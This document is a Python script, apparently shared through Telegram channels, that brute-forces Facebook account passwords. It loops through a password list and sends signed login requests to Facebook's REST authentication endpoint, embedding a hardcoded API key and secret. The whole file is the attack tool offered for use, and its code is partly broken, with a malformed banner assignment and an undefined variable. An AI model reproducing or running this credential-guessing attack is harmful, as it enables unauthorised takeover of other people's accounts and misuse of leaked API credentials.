## fbbrute.py - Facebook Brute Force
# -*- coding: utf-8 -*-
##
import os
import sys
import urllib
import hashlib

API_SECRET = "62f8ce9f74b12f84c123cc23437a4a32"

banner'''
\033[1;92m                           (
                             )
                             (
                       /\  .-***-.  /\
                      //\\/  ,,,  \//\\
                      |/\| ,;;;;;, |/\|
                      //\\\;-***-;///\\
                     //  \/   .   \/  \\
                    (| ,-_| \ | / |_-, |)
                    //`__\.-.-./__`\\
                    // /.-(() ())-.\ \\
                   (\ |)   '---'   (| /)
                   ` (|           |) `
                     \)           (/
       \033[1;91m+=======================================+
       \033[1;91m|..........\033[1;97mBRUTE FORCE FB   \033[1;96mv.1\033[1;91m.........|
       \033[1;91m+---------------------------------------+
       \033[1;91m|\033[1;93m#\033[1;97mAuthor: TARMAY_RASH     >      \033[1;91m       |
       \033[1;91m|\033[1;93m#\033[1;97mChanel Telgarm:Termux_Klailinux   \033[1;91m    |
       \033[1;91m|\033[1;93m#\033[1;97mDate:  10:15:49p m       2021      \033[1;91m   |
       \033[1;91m|\033[1;93m#\033[1;97mThis tool is made for Tarmay Rash   \033[1;91m  |
       \033[1;91m|\033[1;93m#\033[1;97mUser My T.me  @sell_pubg9            \033[1;91m |
       \033[1;91m|\033[1;93m#\033[1;97mUser My Chnel @darkweeb9         \033[1;91m     |
       \033[1;91m|\033[1;93m#\033[1;97mCoder By Tarmay ^_^           \033[1;91m        |
       \033[1;91m|\033[1;93m#\033[1;97mGawrtren Toolu Shaztren Toll Tnha Xom |
       \033[1;91m|\033[1;93m#\033[1;97mAm Toola Taybaty Tarmaya             \033[1;91m |
       \033[1;91m+=======================================+
       \033[1;91m|..........\033[1;97mBrute Force FB   \033[1;96mv.1\033[1;91m.........|
       \033[1;91m+---------------------------------------+
''')

print("[+] Facebook Brute Force\n")
userid = raw_input("[*] Enter [Email|Phone|Username|ID]: ")
try:
	passlist = raw_input("[*] Set PATH to passlist: ")
	if os.path.exists(passlist) != False:
		print(__banner__)
		print(" [+] Account to crack : {}".format(userid))
		print(" [+] Loaded : {}".format(len(open(passlist,"r").read().split("\n"))))
		print(" [+] Cracking, please wait ...")
		for passwd in open(passlist,'r').readlines():
			sys.stdout.write(u"\u001b[1000D[*] Trying {}".format(passwd.strip()))
			sys.stdout.flush()
			sig = "api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail={}format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword={}return_ssl_resources=0v=1.0{}".format(userid,passwd.strip(),API_SECRET)
			xx = hashlib.md5(sig).hexdigest()
			data = "api_key=882a8490361da98702bf97a021ddc14d&credentials_type=password&email={}&format=JSON&generate_machine_id=1&generate_session_cookies=1&locale=en_US&method=auth.login&password={}&return_ssl_resources=0&v=1.0&sig={}".format(userid,passwd.strip(),xx)
			response = urllib.urlopen("https://api.facebook.com/restserver.php?{}".format(data)).read()
			if "error" in response:
				pass
			else:
				print("\n\n[+] Password found .. !!")
				print("\n[+] Password : {}".format(passwd.strip()))
				break
		print("\n\n[!] Done .. !!")
	else:
		print("fbbrute: error: No such file or directory")
except KeyboardInterrupt:
	print("fbbrute: error: Keyboard interrupt")